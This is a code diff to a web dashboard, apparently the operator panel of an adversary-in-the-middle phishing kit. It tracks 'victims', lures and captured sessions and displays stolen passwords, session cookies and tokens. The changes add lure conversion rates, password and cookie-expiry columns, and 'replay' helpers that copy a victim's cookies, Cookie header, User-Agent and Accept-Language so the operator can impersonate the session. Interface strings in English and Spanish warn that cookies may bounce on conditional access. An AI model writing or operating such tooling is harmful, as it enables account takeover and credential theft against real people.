@@ -109,7 +109,7 @@
 
   .stage { flex: 1; display: grid; grid-template-rows: 1fr minmax(280px, 44vh); min-height: 0; }
   .tablewrap { overflow: auto; }
-  table { border-collapse: collapse; width: 100%; min-width: 520px; }
+  table { border-collapse: collapse; width: 100%; min-width: 640px; }
   thead th {
     position: sticky; top: 0; background: var(--bg);
     color: var(--mute); font-weight: 500; font-size: 12px;
@@ -274,20 +274,22 @@
 </header>
 
 <nav class="rail">
+  <button type="button" data-tab="dash"></button>
   <button type="button" class="on" data-tab="victims"></button>
   <button type="button" data-tab="sessions"></button>
   <button type="button" data-tab="lures"></button>
+  <button type="button" data-tab="urls"></button>
   <button type="button" data-tab="settings"></button>
-  <div class="hint">? · c u</div>
+  <div class="hint">? keys</div>
 </nav>
 
 <main>
   <div class="dombar" id="domains"></div>
   <div class="toolbar" id="toolbar">
-    <select id="fphishlet" hidden></select>
+    <select id="fphishlet"></select>
     <label class="chk" id="finboxwrap"><input type="checkbox" id="finbox" checked> <span id="finbox_l"></span></label>
-    <label class="chk" id="fvalidwrap" hidden><input type="checkbox" id="fvalid" checked> <span id="fvalid_l"></span></label>
-    <label class="chk" id="fnoisewrap" hidden><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
+    <label class="chk" id="fvalidwrap"><input type="checkbox" id="fvalid" checked> <span id="fvalid_l"></span></label>
+    <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
     <span class="count" id="count"></span>
   </div>
   <div class="stage" id="stage">
@@ -368,9 +370,9 @@ const I18N = {
     sb_off:'Safe Browsing off',
     flagged:"flagged", mip_title:n=>`same account from ${n} IPs — cookie may bounce on conditional access`,
     ago:(n,u)=>`${n}${u} ago`,
-    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} open</b> · ${st} · ${last}`,
+    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} open</b> · ${r} replayable · ${p} accounts · ${st} · ${last}`,
     help_title:"Keys",
-    help_items:[["/","search"],["j k","move"],["c","copy cookies"],["u","done"],["e","bounced"],["?","this list"]],
+    help_items:[["/","search"],["1–6","views"],["j k","move"],["c","copy cookies"],["b","replay brief"],["h","Cookie header"],["u","done"],["e","bounced"],["?","this list"]],
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
     replay_title:"Replay (manual)", replay_match:"Match the victim",
     replay_import:"Import cookies on", replay_then:"Then open", replay_avoid:"Do not use",
@@ -439,9 +441,9 @@ const I18N = {
     sb_off:'Safe Browsing off',
     flagged:"flaggeado", mip_title:n=>`misma cuenta desde ${n} IPs — la cookie puede rebotar por conditional access`,
     ago:(n,u)=>`hace ${n}${u}`,
-    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} pendientes</b> · ${st} · ${last}`,
+    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} pendientes</b> · ${r} rejugables · ${p} cuentas · ${st} · ${last}`,
     help_title:"Teclas",
-    help_items:[["/","buscar"],["j k","mover"],["c","copiar cookies"],["u","hecha"],["e","rebotó"],["?","esta lista"]],
+    help_items:[["/","buscar"],["1–6","vistas"],["j k","mover"],["c","copiar cookies"],["b","briefing"],["h","cabecera Cookie"],["u","hecha"],["e","rebotó"],["?","esta lista"]],
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
     replay_title:"Replay (manual)", replay_match:"Igualar a la víctima",
     replay_import:"Importar cookies en", replay_then:"Luego abrir", replay_avoid:"No uses",
@@ -581,11 +583,14 @@ function replayBox(s) {
     <div class="insp-actions" style="margin:4px 0 8px">
       ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
       ${s.useragent ? `<button class="btn" data-copytext="${esc(s.useragent)}">${t('replay_copy_ua')}</button>` : ''}
+      ${r.accept_lang ? `<button class="btn" data-copytext="${esc(r.accept_lang)}">${t('replay_copy_al')}</button>` : ''}
       ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">Cookie</button>` : ''}
+      <button class="btn" data-copybrief="${s.id}">${t('replay_copy_brief')}</button>
     </div>
-    <div class="hdr">${esc(s.useragent || '—')}</div>
-    ${r.accept_lang ? `<div class="hdr mut">${esc(r.accept_lang)} <span class="hint">Accept-Language</span></div>` : ''}
+    <div class="hdr">User-Agent<br>${esc(s.useragent || '—')}</div>
+    ${r.accept_lang ? `<div class="hdr mut">Accept-Language <span class="hint">(${t('replay_suggested')})</span><br>${esc(r.accept_lang)}</div>` : ''}
     ${s.password ? `<div style="margin-top:8px">${t('th_pass')} ${passCell(s.password, 's:' + s.id)}</div>` : ''}
+    <div class="hint" style="margin-top:8px">${t('replay_vpn')}</div>
   </div>`;
 }
 function ttlCell(s) {
@@ -648,9 +653,11 @@ function applyStatic() {
   $('#csv').textContent = t('csv'); $('#csv').title = t('csv_t');
   $('#langbtn').textContent = LANG === 'en' ? 'ES' : 'EN';
   const setTab = (id, key) => { const el = document.querySelector('[data-tab="'+id+'"]'); if (el) el.textContent = t(key); };
+  setTab('dash', 'tab_dash');
   setTab('victims', 'tab_victims');
   setTab('sessions', 'tab_sessions');
   setTab('lures', 'tab_lures');
+  setTab('urls', 'tab_urls');
   setTab('settings', 'tab_settings');
   if ($('#fvalid_l')) $('#fvalid_l').textContent = t('only_valid');
   if ($('#fnoise_l')) $('#fnoise_l').textContent = t('show_noise');
@@ -738,8 +745,10 @@ function render() {
   if (tab === 'urls') { renderUrls(); return; }
   if (tab === 'settings') { renderSettings(); return; }
   if (tab === 'lures') { renderLures(); return; }
-  if ($('#fnoisewrap')) $('#fnoisewrap').style.display = 'none';
+  $('#fnoisewrap').style.display = tab === 'sessions' ? '' : 'none';
   $('#finboxwrap').style.display = tab === 'victims' ? '' : 'none';
+  $('#fvalidwrap').style.display = isTable ? '' : 'none';
+  $('#fphishlet').hidden = !isTable;
   if (tab === 'victims') renderVictims(); else renderSessions();
   renderInspector();
 }
@@ -900,16 +909,17 @@ function renderLures() {
   const rows = [...m.values()].sort((a, b) => b.valid - a.valid || b.visits - a.visits);
   $('#luresview').innerHTML =
     `<table><thead><tr>
-       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th></th>
+       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th><th></th>
      </tr></thead><tbody>` +
     (rows.length ? rows.map(e => {
+      const conv = e.visits ? Math.round(e.valid / e.visits * 100) : 0;
       const tgt = lureTarget(e.sessions);
       return `<tr>
-        <td><div class="u">${esc(tgt.name)}</div><div class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</div></td>
+        <td><div class="u">${esc(tgt.name)}</div>${tgt.detail ? `<div class="mut">${esc(tgt.detail)}</div>` : ''}<div class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</div></td>
         <td class="num" style="color:var(--copper)">${esc(lureId(e.url))}</td>
-        <td class="num">${e.visits}</td><td class="num">${e.valid}</td>
+        <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td>
         <td><button class="btn" data-copyurl="${esc(e.url)}">${t('copy')}</button></td></tr>`;
-    }).join('') : `<tr><td colspan="5" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
+    }).join('') : `<tr><td colspan="7" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
 }
 
 async function loadVState() { try { window._vstate = await (await fetch('/api/vstate')).json() || {}; } catch (e) { window._vstate = {}; } }
@@ -938,7 +948,8 @@ function renderVictims() {
   const rows = sortList(filtered, getters);
   state.rows = rows.map(v => ({ type: 'victim', key: v.username.toLowerCase(), data: v }));
   $('#thead').innerHTML = th([
-    ['user', t('th_user'), true], ['valid', t('th_loot'), true], ['', t('th_from'), false], ['update', t('th_seen'), true]
+    ['user', t('th_user'), true], ['valid', t('th_loot'), true], ['pass', t('th_pass'), true],
+    ['', t('th_from'), false], ['expires', t('th_expires'), true], ['update', t('th_seen'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(v => {
     const st = victimStatus(v.username);
@@ -946,10 +957,12 @@ function renderVictims() {
     return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
       <td class="u">${esc(v.username)}${st !== 'inbox' ? ` <span class="st ${st}">${t('st_' + st)}</span>` : ''}</td>
       <td>${kindCell(v.best)}</td>
+      <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
       <td class="mut">${esc(fromLine(v.best))}</td>
+      <td>${ttlCell(v.best)}</td>
       <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="4" class="empty">${state.inbox ? t('empty_inbox') : t('empty_victims')}</td></tr>`;
+  }).join('') : `<tr><td colspan="6" class="empty">${state.inbox ? t('empty_inbox') : t('empty_victims')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
   if (!state.sel || !state.rows.some(r => r.type === state.sel.type && r.key === state.sel.key)) {
     state.sel = rows[0] ? { type: 'victim', key: rows[0].username.toLowerCase() } : null;
@@ -964,17 +977,21 @@ function renderSessions() {
   const rows = sortList(filtered, getters);
   state.rows = rows.map(s => ({ type: 'session', key: String(s.id), data: s }));
   $('#thead').innerHTML = th([
-    ['user', t('th_user'), true], ['valid', t('th_loot'), true], ['', t('th_from'), false], ['update', t('th_captured'), true]
+    ['id', '#', true], ['user', t('th_user'), true], ['valid', t('th_loot'), true], ['pass', t('th_pass'), true],
+    ['', t('th_from'), false], ['expires', t('th_expires'), true], ['update', t('th_captured'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(s => {
     const sel = state.sel && state.sel.type === 'session' && state.sel.key === String(s.id);
     return `<tr data-sel="session:${s.id}" class="${sel ? 'sel' : ''}${state.knownIds.size && !state.knownIds.has(s.id) ? ' new' : ''}">
-      <td>${esc(s.username) || '<span class="mut">#'+s.id+'</span>'}</td>
+      <td class="num">${s.id}</td>
+      <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
       <td>${kindCell(s)}</td>
+      <td>${passCell(s.password, 's:' + s.id)}</td>
       <td class="mut">${esc(fromLine(s))}</td>
+      <td>${ttlCell(s)}</td>
       <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="4" class="empty">${t('empty_sessions')}</td></tr>`;
+  }).join('') : `<tr><td colspan="7" class="empty">${t('empty_sessions')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
   if (!state.sel || !state.rows.some(r => r.type === state.sel.type && r.key === state.sel.key)) {
     state.sel = rows[0] ? { type: 'session', key: String(rows[0].id) } : null;
@@ -996,12 +1013,27 @@ function renderInspector() {
     const ips = [...new Set(v.sessions.map(s => s.remote_addr).filter(Boolean))];
     box.innerHTML = `
       <h2>${esc(v.username)}</h2>
+      <p class="sub">${kindCell(b)} · ${ttlCell(b)}${b && b.token ? ' · '+esc(b.token) : ''}</p>
       <div class="wf">${STATUSES.map(s => `<button type="button" class="btn${victimStatus(v.username)===s?' on':''}" data-status="${s}" data-user="${esc(v.username)}">${t('st_'+s)}</button>`).join('')}</div>
       ${b ? replayBox(b) : ''}
+      <div class="meta-grid">
+        <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
+        <div><div class="k">${t('landing')}</div><div class="v">${esc(b && b.landing)}</div></div>
+        <div><div class="k">${t('th_lastip')}</div><div class="v">${esc(v.lastIP || '')}${ips.length > 1 ? ' · '+ips.size+' IPs' : ''}</div></div>
+      </div>
+      ${v.sessions.length > 1 ? `<div class="k" style="margin-bottom:4px;color:var(--faint)">${t('attempts_h')} (${v.sessions.length})</div>
+      <div class="attempts">${v.sessions.slice().sort((a,b)=>b.update-a.update).map(s => `
+        <div class="a">
+          <span class="mut">#${s.id}</span>
+          ${kindCell(s)}
+          <span class="mut">${esc(fromLine(s))}</span>
+          <span class="mut">${relTime(s.update)}</span>
+          ${s.cookies ? `<button class="btn" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
+        </div>`).join('')}</div>` : ''}
+      <div class="cookies-list" id="ckbox" hidden></div>
       <div class="vstate">
         <input class="notes" id="vs_notes" placeholder="${t('notes_ph')}" value="${esc(vst.notes || '')}">
         <button class="btn" id="vs_save">${t('save')}</button>
-        ${ips.length > 1 ? `<span class="mut">${ips.size} IPs</span>` : ''}
       </div>`;
     const save = $('#vs_save');
     if (save) save.onclick = () => setVictimStatus(v.username, victimStatus(v.username), $('#vs_notes').value);
@@ -1012,7 +1044,13 @@ function renderInspector() {
   const s = row.data;
   box.innerHTML = `
     <h2>${esc(s.username) || '#' + s.id}</h2>
-    ${replayBox(s)}`;
+    <p class="sub">#${s.id} · ${esc(s.phishlet || '')} · ${kindCell(s)} · ${ttlCell(s)}</p>
+    ${replayBox(s)}
+    <div class="meta-grid">
+      <div><div class="k">${t('tokens')}</div><div class="v">${(s.tokens && s.tokens.length) ? s.tokens.map(esc).join(', ') : '—'}</div></div>
+      <div><div class="k">${t('landing')}</div><div class="v">${esc(s.landing)}</div></div>
+    </div>
+    <div class="cookies-list" id="ckbox" hidden></div>`;
 }
 
 async function copyCookieHeader(id) {
@@ -1277,8 +1315,8 @@ document.addEventListener('keydown', e => {
   }
   if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
   if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
-  if (e.key >= '1' && e.key <= '4') {
-    state.tab = ['victims', 'sessions', 'lures', 'settings'][+e.key - 1];
+  if (e.key >= '1' && e.key <= '6') {
+    state.tab = ['dash', 'victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
     state.sel = null; render();
   }
 });
